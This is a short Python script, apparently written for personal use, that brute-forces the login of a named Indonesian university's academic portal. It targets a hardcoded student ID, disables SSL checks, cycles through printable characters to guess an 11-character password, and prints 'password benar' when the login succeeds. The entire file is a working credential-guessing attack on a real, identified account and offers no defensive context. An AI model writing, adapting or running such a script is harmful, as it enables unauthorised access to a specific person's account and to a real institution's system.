import json
import asyncio
import requests
import aiohttp

async def requestlogin(password):
    url = "https://akad.unimed.ac.id/index.php"
    header = {
    "Host" : "akad.unimed.ac.id",
    "User-Agent" : "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Mobile Safari/537.36"
    }
    payload = {
        "usid" : "4203250014",
        "pwd" : "akuhebat123",
        "role" : "s",
        "action" : "login",
    }
    payload["pwd"] = password
    async with aiohttp.TCPConnector(ssl=False) as conn:
            async with aiohttp.ClientSession(connector=conn)as session:
                async with session.post(url=url, data=payload, headers=header) as request:
                    print(password)
                    if request.status == 200:
                        if(str(request.url) == "https://akad.unimed.ac.id/main.php"):
                            print(f"password benar {password}")
                            exit()

async def getLettersList(start):
    elements = [*range(ord(start), 126)]
    elements.extend(range(32, ord(start)))
    return [chr(i) for i in elements]


async def IteratePosition(index):
    global text, PASSWORDLENGHT
    if index == PASSWORDLENGHT - 1:
        for character in await getLettersList(text[index]):
            text[index] = character
            pw = "".join(text)
            print(pw)
            await requestlogin(pw)
    else:
        for character in await getLettersList(text[index]):
            text[index] = character
            await IteratePosition(index + 1)


PASSWORDLENGHT = 11
text = list("akuhebat1}3")
try:
    asyncio.run(IteratePosition(2))
except:
    print("something error")